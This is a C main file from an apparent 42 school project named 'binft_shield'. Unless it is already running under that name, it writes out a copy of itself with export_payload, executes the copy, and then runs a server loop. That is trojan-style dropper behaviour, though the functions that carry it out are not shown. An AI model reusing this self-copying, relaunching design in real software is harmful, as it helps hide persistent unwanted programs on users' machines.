/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/21 13:31:38 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

int	g_sig = 0;

void	handle_sig(int sig)
{
	g_sig = sig;
}

int	ctx_loop(t_ctx *ctx)
{
	while (g_sig == 0)
	{
		server_update(&ctx->server);

	}
	return (1);
}

int	main(int ac, char **av, char **envp)
{
	ac = 42;
	if (!strstr(av[0], "binft_shield"))
	{
		export_payload(av[0], "binft_shield");
		exec_payload("./binft_shield", envp);
		return (0);
	}

	t_ctx	ctx;

	if (!ctx_init(&ctx))
		return (0);
	ctx_loop(&ctx);
	return (ctx_delete(&ctx));
}
